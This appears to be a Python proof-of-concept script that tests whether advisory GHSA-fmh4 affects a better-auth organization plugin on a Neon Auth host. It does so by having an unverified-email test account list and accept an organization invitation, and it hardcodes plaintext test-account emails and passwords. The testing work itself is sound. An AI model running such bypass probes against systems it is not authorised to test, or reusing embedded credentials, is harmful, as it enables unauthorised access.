# -*- coding: utf-8 -*-
"""Organization 插件 GHSA-fmh4 适用性验证(双用户链):
na2(已验证?) 创建 org -> invite na1(未验证邮箱)
-> na1 listUserInvitations/accept-invitation 是否被 verified-email 门禁拦截
零破坏:na1/na2 均为自有测试用户;org 为测试 org"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'

def login(email, pw):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': pw}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in (hdrs.get('set-cookie', '')).split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, raw.decode('utf-8', 'replace'), ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

print('=== [1] na2 登录(主控) ===', flush=True)
st, raw, ck2 = login('libobo1229+na2@gmail.com', 'SecTest!2026pass2')
print('na2:', st, raw[:120].replace('\n', ' '), 'ck:', ck2[:50], flush=True)
# na2 emailVerified 状态(从 JWT/会话)
import base64
def dec(s):
    s2 = s.replace('-', '+').replace('_', '/')
    s2 += '=' * (-len(s2) % 4)
    return base64.b64decode(s2).decode('utf-8', 'replace')
st_t, raw_t = req(ck2, 'GET', '/token')
print('na2 /token:', st_t)
if st_t == 200:
    tj = json.loads(raw_t).get('token', '')
    p = json.loads(dec(tj.split('.')[1]))
    print('  na2 emailVerified=%s role=%s' % (p.get('emailVerified'), p.get('role')), flush=True)

print('\n=== [2] na2 创建 org ===', flush=True)
st, raw = req(ck2, 'POST', '/organization/create', {'name': 'sec-n11-org'})
print('create org:', st, raw[:300].replace('\n', ' '), flush=True)
org_id = None
try:
    d = json.loads(raw)
    org_id = (d.get('data') or d).get('id') if isinstance(d, dict) else None
    print('org_id:', org_id, flush=True)
except Exception:
    pass

print('\n=== [3] na2 invite na1(未验证邮箱) ===', flush=True)
st, raw = req(ck2, 'POST', '/organization/invite-member',
              {'email': 'libobo1229+na1@gmail.com', 'role': 'member', 'organizationId': org_id})
print('invite:', st, raw[:400].replace('\n', ' '), flush=True)
inv_id = None
try:
    d = json.loads(raw)
    dd = d.get('data') or d
    inv_id = dd.get('id') if isinstance(dd, dict) else None
    print('invitation_id:', inv_id, flush=True)
except Exception:
    pass

print('\n=== [4] na1 登录(受邀方,未验证) + 邀请可见性 ===', flush=True)
st, raw, ck1 = login('libobo1229+na1@gmail.com', 'SecTest!2026pass2')
print('na1:', st, raw[:120].replace('\n', ' '), 'ck:', ck1[:50], flush=True)
if ck1:
    st_t1, raw_t1 = req(ck1, 'GET', '/token')
    if st_t1 == 200:
        p1 = json.loads(dec(json.loads(raw_t1).get('token', '').split('.')[1]))
        print('  na1 emailVerified=%s' % p1.get('emailVerified'), flush=True)
    # listUserInvitations(better-auth:GET/POST /organization/invitations?)
    for m2, p2 in [('GET', '/organization/invitations'), ('POST', '/organization/invitations', None),
                   ('GET', '/organization/invitation'), ('POST', '/organization/list-invitations', {})]:
        if isinstance(p2, tuple):
            m2, p2, b = p2
        else:
            b = None
        st2, raw2 = req(ck1, m2, p2, b)
        print('[%s %s] -> %d %s' % (m2, p2, st2, raw2[:250].replace('\n', ' ')), flush=True)
        time.sleep(0.2)
    # 若有 invitation id,试 accept(带 inv_id)
    if inv_id:
        st3, raw3 = req(ck1, 'POST', '/organization/accept-invitation', {'invitationId': inv_id})
        print('[na1 accept %s] -> %d %s' % (inv_id, st3, raw3[:250].replace('\n', ' ')), flush=True)
        st4, raw4 = req(ck1, 'POST', '/organization/get-invitation', {'invitationId': inv_id})
        print('[na1 get-invitation] -> %d %s' % (st4, raw4[:250].replace('\n', ' ')), flush=True)

print('\n=== [5] 收尾:na2 确认 org 状态(留档) ===', flush=True)
st5, raw5 = req(ck2, 'GET', '/organization/list')
print('na2 org list:', st5, raw5[:400].replace('\n', ' '), flush=True)
